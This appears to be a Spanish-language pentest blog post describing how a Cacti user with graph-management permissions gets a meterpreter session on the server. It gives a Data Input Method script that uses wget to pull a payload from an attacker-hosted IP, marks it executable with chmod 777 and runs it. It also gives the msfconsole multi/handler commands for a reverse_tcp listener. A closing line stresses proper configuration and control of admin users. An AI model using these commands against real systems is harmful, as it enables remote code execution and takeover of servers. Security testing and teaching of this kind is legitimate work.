---
title: "Obteniendo una sesión meterpreter a través de la interfaz web de Cacti"
author: Adan Alvarez
classes: wide
excerpt: "En la siguiente entrada se detalla como un usuario con permisos para gestionar gráficas en Cacti podría obtener acceso al servidor mediante una sesión meterpreter a través de una funcionalidad que ofrece Cacti."
categories:
  - Pentest
tags:
  - Red Team
  - Vulnerabilidades
---
En la siguiente entrada se detalla como un usuario con permisos para gestionar gráficas en [Cacti](http://www.cacti.net/) podría obtener acceso al servidor mediante una sesión meterpreter a través de una funcionalidad que ofrece Cacti.
{: style="text-align: justify;"}

En primer lugar creamos nuestro payload utilizando msfpayload:
{: style="text-align: justify;"}

[![msfpayload](https://donttouchmy.net/wp-content/uploads/2016/06/msfpayload-300x32.png)](https://donttouchmy.net/wp-content/uploads/2016/06/msfpayload.png)

Donde IP será la IP a la cual se conectará de forma reversa el payload.
{: style="text-align: justify;"}

Una vez creado el payload, deberemos dejar este en un lugar accesible para ser descargado desde Internet.
{: style="text-align: justify;"}

Después de esto accedemos a la interfaz web de cacti y vamos al apartado Data Input Methods. En este, añadimos un nuevo método del tipo Script/Command y como Input Script introducimos un wget para descargar el payload a la carpeta rra de cacti, introduciendo como IP la ip donde está alojado el fichero, un chmod para dar permisos de ejecución y por último indicamos que se ejecute el payload.
{: style="text-align: justify;"}

**Importante**: Se elige la carpeta rra porque cacti tiene que tener permisos en ella, ya que es la carpeta en la cual se guardan los ficheros rrd.
{: style="text-align: justify;"}

[![inputmethod](https://donttouchmy.net/wp-content/uploads/2016/06/inputmethod-300x73.png)](https://donttouchmy.net/wp-content/uploads/2016/06/inputmethod.png)
```
*wget -P <path_cacti>/rra/ IP/metercacti.bin; chmod 777 <path_cacti>/rra/metercacti.bin; <path_cacti>/rra/metercacti.bin*
```
Después de añadir el Data Input Method deberemos crear un Data Source que será el encargado de ejecutar este script. Para esto nos dirigimos a Data Sources y añadimos uno nuevo. La única importancia de este data source es que en Data Input Method se llame al método creado en el paso anterior:
{: style="text-align: justify;"}

[![datasource](https://donttouchmy.net/wp-content/uploads/2016/06/datasource-300x153.png)](https://donttouchmy.net/wp-content/uploads/2016/06/datasource.png)

Una vez seguidos estos pasos,  en la próxima ejecución de cacti, se llamará a nuestro método y se ejecutarán los comandos introducidos. Por esto, accedemos a msfconsole y nos quedamos escuchando a la espera de que se ejecuten.
{: style="text-align: justify;"}

[![msfconsole](https://donttouchmy.net/wp-content/uploads/2016/06/msfconsole-300x239.png)](https://donttouchmy.net/wp-content/uploads/2016/06/msfconsole.png)
```
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST IP [Donde IP es la ip donde se debe conectar el payload]
exploit
```
Con todo esto en la próxima ejecución de cacti tendremos nuestra sesión meterpreter:
{: style="text-align: justify;"}

[![sesión meterpreter ](https://donttouchmy.net/wp-content/uploads/2016/06/meterpreter-300x60.png)](https://donttouchmy.net/wp-content/uploads/2016/06/meterpreter.png)

Por último, los privilegios de esta sesión meterpreter serán los mismos que los del usuario que ejecuta el script, si de forma incorrecta se ha configurado el usuario root tendremos acceso total a la máquina. Con esto se demuestra lo importante que es configurar una aplicación de forma correcta y tener controlados los usuarios que tienen acceso al administrador.
{: style="text-align: justify;"}
